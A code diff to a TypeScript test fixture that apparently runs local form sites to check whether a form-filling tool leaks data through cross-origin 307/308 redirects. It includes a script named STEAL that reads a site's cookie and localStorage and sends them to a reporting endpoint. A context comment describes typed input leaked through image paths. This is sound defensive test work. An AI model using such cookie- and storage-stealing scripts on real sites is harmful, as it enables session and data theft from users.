@@ -78,6 +78,12 @@ import {
  *                 email box invalid and shows "Thank you for applying!" above the form
  *   assets        name, email and location; loads a logo from localhost, and on input asks localhost
  *                 for images whose paths carry pieces of what was typed (base64 pieces, the first word)
+ *   post-307-away email and full name posted natively; the site answers 307 to `other` (127.0.0.1 on
+ *                 another port: an allowed host, another origin), whose page reads this site's
+ *                 cookie and localStorage (set when the form loads) and reports them to /web/report
+ *   post-308-away the same, answered 308
+ *   post-307-same the same form; the site answers 307 to /web/post-307-same/received on itself,
+ *                 which thanks
  */
 
 export interface WebSubmission {
@@ -96,6 +102,10 @@ export interface FixtureWebForms {
 	count(variant: string): number;
 	/** Every request that reached localhost (the other site). */
 	away: { method: string; path: string }[];
+	/** Another origin on an allowed host (127.0.0.1, another port), and every request it got. */
+	other: { url: string; hits: { method: string; path: string }[] };
+	/** The query of every `/web/report` request (what a page managed to read), on any origin. */
+	reports: string[];
 	close(): Promise<void>;
 }
 
@@ -340,6 +350,15 @@ ${text("Email address", "email", { type: "email" })}${text("Full name", "full_na
 <p><button type="submit">Submit application</button></p></form>`;
 }
 
+/** The site's own secrets, kept where only its own pages may read them. */
+const SECRETS = `document.cookie = 'session=site-secret; path=/'; localStorage.setItem('secret', 'site-storage');`;
+
+/** The other origin's page: reads what it can of the site it runs as and reports it there. */
+const STEAL = page(
+	"<h1>Elsewhere</h1>",
+	`let stored = ''; try { stored = localStorage.getItem('secret') ?? ''; } catch (e) { stored = 'blocked'; } fetch('/web/report?cookie=' + encodeURIComponent(document.cookie) + '&stored=' + encodeURIComponent(stored));`,
+);
+
 /** On submit: keeps the answers aside, strips the boxes' names and posts only "event=click". */
 const LATER_NATIVE = `const form = document.getElementById('apply');
 form.addEventListener('submit', () => {
@@ -473,7 +492,28 @@ form.addEventListener('submit', async (e) => {
 function postAnswer(
 	variant: string,
 	action: string,
+	otherOrigin: string,
 ): { status: number; headers: Record<string, string>; body: string } {
+	if (variant === "post-307-away" || variant === "post-308-away")
+		return {
+			status: variant === "post-307-away" ? 307 : 308,
+			headers: { location: `${otherOrigin}/web/${variant}/landing` },
+			body: "",
+		};
+	if (variant === "post-307-same" && action === "apply")
+		return {
+			status: 307,
+			headers: { location: `/web/${variant}/received` },
+			body: "",
+		};
+	if (variant === "post-307-same" && action === "received")
+		return {
+			status: 200,
+			headers: { "content-type": "text/html; charset=utf-8" },
+			body: page(
+				"<h1>Thank you for applying to Acme Robotics</h1><p>We have received your application and will reply by email.</p>",
+			),
+		};
 	if (variant === "rejected")
 		return {
 			status: 500,
@@ -603,6 +643,10 @@ function formPage(
 		case "error200":
 		case "error-hidden":
 			return page(nativeBody(variant));
+		case "post-307-away":
+		case "post-308-away":
+		case "post-307-same":
+			return page(nativeBody(variant), SECRETS);
 		case "invalid-after":
 			return page(scriptedBody(), scripted(variant));
 		case "script-button":
@@ -637,10 +681,17 @@ function answerPost(
 	res: ServerResponse,
 	variant: string,
 	action: string,
-	held: (() => void)[],
-	hanging: ServerResponse[],
+	{
+		held,
+		hanging,
+		otherOrigin,
+	}: {
+		held: (() => void)[];
+		hanging: ServerResponse[];
+		otherOrigin: string;
+	},
 ): void {
-	const answer = postAnswer(variant, action);
+	const answer = postAnswer(variant, action, otherOrigin);
 	const reply = () => {
 		res.writeHead(answer.status, answer.headers);
 		res.end(answer.body);
@@ -663,6 +714,17 @@ export async function startFixtureWebForms(): Promise<FixtureWebForms> {
 	const loads = new Map<string, number>();
 	const held: (() => void)[] = [];
 	const hanging: ServerResponse[] = [];
+	const reports: string[] = [];
+	const otherHits: { method: string; path: string }[] = [];
+	const other = createServer((req, res) => {
+		const url = new URL(req.url ?? "/", "http://fixture");
+		otherHits.push({ method: req.method ?? "", path: url.pathname });
+		if (url.pathname === "/web/report") reports.push(url.search);
+		res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
+		res.end(STEAL);
+	});
+	await new Promise<void>((done) => other.listen(0, "127.0.0.1", done));
+	const otherOrigin = `http://127.0.0.1:${(other.address() as { port: number }).port}`;
 	const server = createServer(async (req, res) => {
 		const host = (req.headers.host ?? "").split(":")[0] ?? "";
 		const port = (req.headers.host ?? "").split(":")[1] ?? "";
@@ -676,6 +738,10 @@ export async function startFixtureWebForms(): Promise<FixtureWebForms> {
 			away.push({ method: req.method ?? "", path: url.pathname });
 		const [, root, variant = "", action = ""] = url.pathname.split("/");
 		if (root !== "web") return html(404, page("<h1>Not found</h1>"));
+		if (variant === "report") {
+			reports.push(url.search);
+			return html(200, page("<p>noted</p>"));
+		}
 		if (req.method === "POST") {
 			const body = await bodyOf(req);
 			submissions.push({
@@ -685,7 +751,7 @@ export async function startFixtureWebForms(): Promise<FixtureWebForms> {
 				fields: [...body.matchAll(/name="([^"]+)"/g)].map((m) => m[1] ?? ""),
 				body,
 			});
-			return answerPost(res, variant, action, held, hanging);
+			return answerPost(res, variant, action, { held, hanging, otherOrigin });
 		}
 		if (action === "thanks" || (variant === "native-get" && action === "sent"))
 			return html(
@@ -707,6 +773,8 @@ export async function startFixtureWebForms(): Promise<FixtureWebForms> {
 		server,
 		submissions,
 		away,
+		other: { url: otherOrigin, hits: otherHits },
+		reports,
 		count: (variant) =>
 			submissions.filter((s) => s.variant === variant && s.host === "127.0.0.1")
 				.length,
@@ -718,6 +786,8 @@ export async function startFixtureWebForms(): Promise<FixtureWebForms> {
 					res.end();
 				}
 				server.closeAllConnections?.();
+				other.closeAllConnections?.();
+				other.close();
 				server.close(() => done());
 			}),
 	};
